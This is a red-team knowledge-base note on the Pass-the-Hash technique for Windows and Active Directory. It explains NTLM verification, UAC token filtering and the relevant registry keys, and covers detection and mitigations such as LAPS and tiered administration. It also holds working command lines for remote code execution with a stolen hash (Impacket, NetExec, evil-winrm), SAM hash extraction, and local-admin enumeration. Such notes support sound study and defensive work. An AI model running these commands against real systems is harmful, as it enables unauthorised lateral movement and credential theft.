---
title: Pass-the-Hash
aliases:
  - Pass the Hash
  - PtH
type: technique
domain:
  - red-team
attack_tactic:
  - lateral-movement
  - credential-access
tags:
  - type/technique
  - domain/red-team
  - attack/lateral-movement
  - proto/ntlm
source:
  - "[[Source - zer1t0 - Attacking Active Directory]]"
  - "[[Source - harmj0y blog]]"
  - "[[Source - hackndo blog]]"
source_url: https://zer1t0.gitlab.io/posts/attacking_ad/
verified: true
related:
  - "[[NTLM Authentication]]"
  - "[[LM and NT Hashes]]"
  - "[[LSASS Dumping]]"
  - "[[Overpass-the-Hash]]"
  - "[[Remote Execution & Lateral Movement (Windows)]]"
  - "[[PowerView]]"
  - "[[LAPS]]"
created: 2026-06-06
updated: 2026-06-07
---

# Pass-the-Hash

> [!summary] One-liner
> Authenticate over NTLM using the NT hash directly — no plaintext password needed.

## Concept abused
[[NTLM Authentication]] proves knowledge of the **[[LM and NT Hashes|NT hash]]**, not the password — so the hash *is* the credential (NTLM is effectively stateless this way).

### Local vs domain authentication flow
When NTLM auth reaches the target server the verification path differs by account type:
- **Local account**: the server validates the challenge/response directly against its local **SAM** database.
- **Domain account**: the server cannot verify alone — it forwards the challenge/response to a **Domain Controller** over a **Netlogon Secure Channel** (MS-NRPC). The DC performs the actual hash comparison and returns the result.

This distinction matters for PtH because UAC remote token filtering and the `LocalAccountTokenFilterPolicy` / `FilterAdministratorToken` registry keys only govern *local* account authentication. Domain accounts bypass those controls entirely.

## Prerequisites
- A target's **NT hash** (from [[LSASS Dumping]], [[SAM and LSA Secrets Dump]], [[DCSync]]).
- A service that accepts NTLM and an account with rights on the target.

## Commands & tools
```bash
# Impacket - PtH to remote code execution
psexec.py contoso.local/Administrator@10.0.0.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
wmiexec.py contoso.local/Administrator@10.0.0.10 -hashes :<NThash>

# NetExec - spray a hash across hosts
nxc smb 10.0.0.0/24 -u Administrator -H <NThash> --local-auth

# evil-winrm
evil-winrm -i 10.0.0.10 -u Administrator -H <NThash>
```
> `-hashes :NTHASH` (the empty part before `:` is the unused LM half).

```bash
# SAM extraction — obtain local hashes for PtH (requires SYSTEM/admin)
reg.exe save hklm\sam sam.save
reg.exe save hklm\system system.save
# then offline:
secretsdump.py -sam sam.save -system system.save LOCAL
```

## Detection / artifacts
NTLM logons (4624 type 3) with the NT hash; lateral-movement service/WMI artifacts; impossible to distinguish from legit NTLM without baselining.

## Mitigation
LAPS (unique local-admin pw), **Protected Users** (no NTLM), no shared local admins, Credential Guard, least privilege, SMB restrictions.

### Microsoft LAPS (Local Administrator Password Solution)
**[[LAPS]]** automatically manages a unique, random local-admin password on every workstation and stores it in AD. This kills PtH hash reuse across hosts — even if an attacker dumps one machine's local admin hash, it is useless on every other machine.

### Silo Administration (Administrative Tier Model)
Restrict admin credentials to specific security zones so that a single compromised credential cannot traverse the entire environment:
- **Tier 0 — Domain Controllers**: only DC-admin accounts; never used on workstations or member servers.
- **Tier 1 — Member servers**: separate admin accounts scoped to servers only.
- **Tier 2 — Workstations**: separate admin accounts scoped to workstations only.

By siloing credentials, a PtH attacker who captures a Tier 2 workstation-admin hash cannot pivot to servers or DCs.

## More from harmj0y (KB2871997 & UAC token filtering — what PtH actually still works)

> [!note] Author correction
> harmj0y's first post ("Pass-the-Hash Is Dead: Long Live Pass-the-Hash") was later corrected by the second ("...Long Live LocalAccountTokenFilterPolicy"). Several KB2871997 claims in the first post are wrong; the LocalAccountTokenFilterPolicy post is the authoritative version and is what the registry/UAC details below are anchored to.

### What KB2871997 actually does (and does NOT do)
- KB2871997 (backported to Windows 7 / Server 2008 / 2008 R2 / 2012; native in Windows 8.1+ and Server 2012 R2+) **does NOT prevent pass-the-hash by default**. Its main relevant additions are two new SIDs that can be used in Group Policy to *deny* remote logon for local accounts:
  - **`S-1-5-113`** = `NT AUTHORITY\Local account`
  - **`S-1-5-114`** = `NT AUTHORITY\Local account and member of Administrators group`
- These only block remote local-account logon **if you explicitly configure a GPO** to use them (e.g., "Deny access to this computer from the network"). Out of the box, the patch changes nothing for PtH.

### The real control: UAC remote token filtering (predates KB2871997)
The behavior that actually limits PtH for *local* accounts has existed since Windows Vista — UAC "remote restrictions" / token filtering over the network:

- **Non-RID-500 local admin accounts**: token is **filtered to medium integrity** when authenticating remotely. Despite being in the local Administrators group, they **cannot reach privileged resources** (e.g., `ADMIN$`), so WMI/PSEXEC/remote PtH **fails**.
- **RID 500 built-in Administrator account** (even if renamed): runs in **full-token mode** by default — UAC token filtering is **not** applied. It receives a high-integrity (non-filtered) token remotely, so **remote PtH succeeds** — *unless* `FilterAdministratorToken` is enabled. RID 500 is disabled by default but commonly re-enabled in enterprises.
- **Domain accounts** that are members of the local Administrators group: receive a **full administrator token remotely** (UAC disabled for that remote session). They are **unaffected** by `LocalAccountTokenFilterPolicy` or `FilterAdministratorToken`. This is the big lateral-movement path — domain admin/local-admin domain accounts can always PtH. See [[Overpass-the-Hash]].

### Registry keys & values (quote exactly)
```text
# Forces RID 500 into UAC token filtering (Admin Approval Mode for built-in Admin)
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken
  Default: 0 (disabled)  -> RID 500 gets full high-integrity token remotely (PtH works)
  Set to 1 (enabled)     -> RID 500 token is filtered; remote PtH blocked

# Overrides UAC remote restrictions for ALL local admins
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
  Default: value does NOT exist
  Set to 1 -> remote connections from all local members of Administrators are granted
              full high-integrity tokens during negotiation (re-enables PtH for ALL local admins)
```
> `LocalAccountTokenFilterPolicy = 1` is the misconfiguration that resurrects PtH for every local admin — frequently introduced by: WinRM/PowerShell remoting setup (`enable-psremoting` / `winrm quickconfig`), credentialed vuln scanning (Nessus), workgroup remote-management workarounds, and Microsoft troubleshooting docs recommending the setting.

### Combination table: LATFP + FAT effect on remote PtH for local accounts

| LocalAccountTokenFilterPolicy | FilterAdministratorToken | Who can remote-admin (PtH)? |
|:---:|:---:|:---|
| 0 (default / absent) | 0 (default) | **RID 500 only** — all other local admins are token-filtered |
| 0 (default / absent) | 1 | **Nobody** — even RID 500 is filtered; no local account can remote-admin |
| 1 | 0 | **All local admins** — every member of local Administrators gets a full token |
| 1 | 1 | **All local admins** — LATFP=1 overrides FAT; all local admins get a full token |

> Domain admin accounts that are members of the local Administrators group are **not governed by either key** and always receive a full token remotely.

### Enumeration (post-patch reconnaissance)
```powershell
# PowerView - local group / local admin enumeration
Get-NetLocalGroups            # list local groups on a host
Get-NetLocalGroup             # enumerate members with SIDs
Invoke-EnumerateLocalAdmins   # query domain hosts for local-admin membership

# PowerView - find domain machines likely reachable via WinRM (PS remoting endpoints)
Get-DomainComputer -LDAPFilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" `
  -SPN "wsman*" -Properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl
```
```powershell
# WinNT / ADSI provider - non-privileged domain users can read remote local groups
$computer = [ADSI]"WinNT://WINDOWS2,computer"
$computer.psbase.children | where { $_.psbase.schemaClassName -eq 'group' }

# members of a specific local group
$members = @($([ADSI]"WinNT://WINDOWS2/Administrators").psbase.Invoke("Members"))
$members | foreach { $_.GetType().InvokeMember("ADpath", 'GetProperty', $null, $_, $null) }
```
```bash
# Nmap alternative - enumerate users/groups with a passed hash
nmap -p U:137,T:139 --script-args 'smbuser=mike,smbhash=8846f7eaee8fb117ad06bdd830b7586c' \
  --script=smb-enum-groups --script=smb-enum-users 192.168.52.151
```
> Domain authenticated users can also enumerate GPO-applied `FilterAdministratorToken` / `LocalAccountTokenFilterPolicy` settings by reading the relevant Group Policy Objects.

### What still works after the patch (OPSEC summary)
- **RDP with plaintext creds** for a local admin still works (`rdesktop -u mike -p password 192.168.52.151`) — RDP is interactive logon, not network logon.
- **PowerShell remoting / WinRM** works if WinRM is enabled (and `LocalAccountTokenFilterPolicy=1` widens it to all local admins).
- **Domain accounts** with admin rights can always PtH (Metasploit, PtH toolkits, agent install, code exec) to systems where they hold admin — unaffected by the local-account restrictions.
- **RID 500** can PtH unless `FilterAdministratorToken=1`.

### Mitigation (harmj0y)
1. Deploy GPOs denying network/remote logon to local accounts via **S-1-5-113** / **S-1-5-114**.
2. Implement [[LAPS]] to randomize local-admin passwords (kills hash reuse across hosts).
3. Enable **`FilterAdministratorToken = 1`** on RID 500 accounts.
4. Ensure **`LocalAccountTokenFilterPolicy = 0`** (or that the value does not exist).
5. Deny network logon rights to local administrative accounts via GPO.

## Related
- Kerberos equivalent: [[Overpass-the-Hash]]; execution mechanics: [[Remote Execution & Lateral Movement (Windows)]]; recon tooling: [[PowerView]]; password randomization defense: [[LAPS]].

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "NTLM Attacks → Pass the hash"
- [[Source - harmj0y blog]] — "Pass-the-Hash Is Dead: Long Live Pass-the-Hash" — https://blog.harmj0y.net/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/
- [[Source - harmj0y blog]] — "Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy" — https://blog.harmj0y.net/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/
- [[Source - hackndo blog]] — "Pass the Hash" — https://en.hackndo.com/pass-the-hash/
